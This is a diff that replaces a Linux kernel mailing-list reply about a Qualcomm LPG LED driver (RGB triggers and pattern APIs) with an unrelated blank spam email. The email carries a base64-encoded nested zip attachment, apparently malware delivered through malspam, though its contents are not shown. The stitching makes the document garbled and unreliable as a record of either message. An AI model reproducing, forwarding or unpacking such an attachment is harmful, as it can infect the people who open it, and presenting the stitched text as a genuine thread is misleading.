@@ -1,144 +1,87 @@
-From: Jacek Anaszewski <jacek.anaszewski-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
-Subject: Re: [PATCH 1/2] leds: Add driver for Qualcomm LPG
-Date: Mon, 3 Apr 2017 22:38:58 +0200
-Message-ID: <dce7f2b1-8d1d-1c5d-5fa5-54c22b6f4758@gmail.com>
-References: <20170323055435.29197-1-bjorn.andersson@linaro.org>
- <20170323203749.GB8563@amd> <20170329021734.afhqmfpmbcjyv7bu@rob-hp-laptop>
- <20170329190725.GN20094@minitux> <20170329222301.GB7977@amd>
- <20170330000955.GP20094@minitux> <20170330074309.GA28533@amd>
- <bf999f34-4509-6f0b-602c-f82d50a18e97@gmail.com>
- <20170403190032.GX20094@minitux>
+From: <bunny43200@yahoo.com>
+Subject: (unknown)
+Date: Wed, 05 Apr 2017 16:35:10 -0000
+Message-ID: <149141011005.21467.12461564747801833043@perm.ru>
+Reply-To: <bunny43200@yahoo.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=windows-1252
-Content-Transfer-Encoding: 8bit
-Return-path: <devicetree-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
-In-Reply-To: <20170403190032.GX20094@minitux>
-Sender: devicetree-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-To: Bjorn Andersson <bjorn.andersson-QSEj5FYQhm4dnm+yROfE0A@public.gmane.org>
-Cc: Pavel Machek <pavel-+ZI9xUNit7I@public.gmane.org>, Rob Herring <robh-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org>, Richard Purdie <rpurdie-Fm38FmjxZ/leoWH0uzbU5w@public.gmane.org>, linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-leds-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-arm-msm-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Mark Rutland <mark.rutland-5wv7dgnIgG8@public.gmane.org>, devicetree-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
+Content-Type: application/zip; name="74850.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-leds-owner@vger.kernel.org>
+Received: from homeuser254-243.ccl.perm.ru ([89.148.254.243]:33215 "HELO
+        perm.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1754782AbdDEQfb (ORCPT <rfc822;linux-leds@vger.kernel.org>);
+        Wed, 5 Apr 2017 12:35:31 -0400
+Subject: 
+Content-Disposition: attachment
+Sender: linux-leds-owner@vger.kernel.org
 List-Id: linux-leds@vger.kernel.org
+To: linux-leds@vger.kernel.org
 
-On 04/03/2017 09:00 PM, Bjorn Andersson wrote:
-> On Fri 31 Mar 02:28 PDT 2017, Jacek Anaszewski wrote:
-> 
->> Hi Bjorn and Pavel,
->>
->> On 03/30/2017 09:43 AM, Pavel Machek wrote:
->>> Hi!
->>>
->>>>>> There is a binding for ti,lp55xx, but there's nothing I can reuse from
->>>>>> that binding...because it's completely different hardware.
->>>>>
->>>>> Agreed, if you drop the pattern stuff from the binding, at least for now. 
->>>>
->>>> I do not have a strong preference to expose these knobs in devicetree
->>>> and I do fear that finding some common "pattern" bindings that suits
->>>> everyone will be very difficult.
->>>>
->>>> So I'll drop them from the binding for now.
->>>
->>> Ok.
->>>
->>>>> If you want driver merged quickly, I believe the best way would be to
->>>>> leave out pattern support for now. We can merge the basic driver
->>>>> easily to 4.12.
->>>>>
->>>>
->>>> I'm not that much in a hurry and would rather see that we resolve any
->>>> outstanding issues with the implementation of the pattern handling.
->>>
->>> Ok, good.
->>>
->>>> But regardless of this we still have the problem that the typical
->>>> Qualcomm PMIC has 8 LPG-blocks and any triple could be driving a
->>>> RGB-LED. So we would have to create some sort of in-driver-wrapper
->>>> around any three instances exposing them as a single LED to the user.
->>>
->>> Yes, I believe we should do the wrapping. In N900 case, 
->>>
->>>> I rather expose the individual channels and make sure that when we
->>>> trigger a blink operation or enable a pattern (i.e. the two operations
->>>> that do require synchronization) we will perform that synchronization
->>>> under the hood.
->>>
->>> First, we need a way to tell userspace which LEDs are synchronized,
->>> because otherwise it will be confusing.
->>
->> There is one year old discussion [0] about the possible approaches
->> to RGB sub-LEDs synchronization problem and patterns in general.
->> My last message with API design proposal has been left unanswered.
->>
->> Probably we continue that discussion here.
->>
->> Generally Bjorn's drivers touch two yet to be addressed issues:
->> - RGB LED support
->> - Generic support for patterns
->>
->> It is likely that both issues can be solved by utilizing trigger
->> mechanism. The possible solution to the problem Bjorn tried to
->> address with /sys/class/leds/<led>/pattern comma separated list
->> could be a trigger with adjustable number of pattern intervals.
->>
->> The trigger once activated would create a directory with the
->> number of files corresponding to the number of requested intervals,
->> and then user could write an interval value by writing it to the
->> corresponding file. Somehow related approach has been implemented
->> for USB port LED trigger:
->>
->> 0f247626cbbf ('usb: core: Introduce a USB port LED trigger")
->>
->> In both RGB and pattern approaches we should assess
->> if it is acceptable to provide a pattern for trigger name,
->> e.g. blink-pattern-{num_intervals}.
->>
->> If so, then "echo transition-pattern-15" would create a directory
->> e.g. transition_intervals with files interval_0 to interval_14,
->> that could be adjusted by userspace.
->>
-> 
-> Having a RGB-trigger that proxy a accepts a userspace request of a
-> brightness-tripple and sets the brightness on the individual associated
-> LEDs sounds reasonable - but should probably be generalized to any
-> number of LEDs.
-> 
-> A slightly related matter is the question on how to use a single LED for
-> multiple trigger sources, e.g. how do I get a single LED to show
-> activity of two MMCs?.
-
-You would have to add a dedicated trigger, similar to usb port trigger,
-I mentioned in the previous message.
-
-> 
-> For the patterns I don't know how a trigger for this would look like,
-> how would setting the pattern of a trigger be propagated down to the
-> hardware?
-
-We'd need a new op and API similar to blink_set()/led_blink_set().
-
->>> Second, there are more issues than just patterns with the RGB
->>> LED. Most important is ability to set particular colors. You want to
->>> set the RGB LED to "white", but that does not mean you can set
->>> red=green=blue=1.0. You want color to look the same on LCD and on the
->>> LED, which means coefficients for white and some kind of function for
->>> brightness-to-PWM conversion.
->>
->> Shouldn't we leave that entirely to the userspace? Can we come up
->> with coefficients that will guarantee the same result on all existing
->> LCD devices?
->>
-> 
-> How about we just force user space perform the 3 writes and save us the
-> cost of another trigger in that case? Configuring the brightness of 3
-> LEDs is not board specific - and even with a RGB-interface we still need
-> to specify which RGB-LED should be controlled.
-
-This is what we have now, so we can live with it. Addition of a new
-RGB trigger would be an improvement of the existing state.
-
--- 
-Best regards,
-Jacek Anaszewski
---
-To unsubscribe from this list: send the line "unsubscribe devicetree" in
-the body of a message to majordomo-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-More majordomo info at  http://vger.kernel.org/majordomo-info.html
+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
+AA==
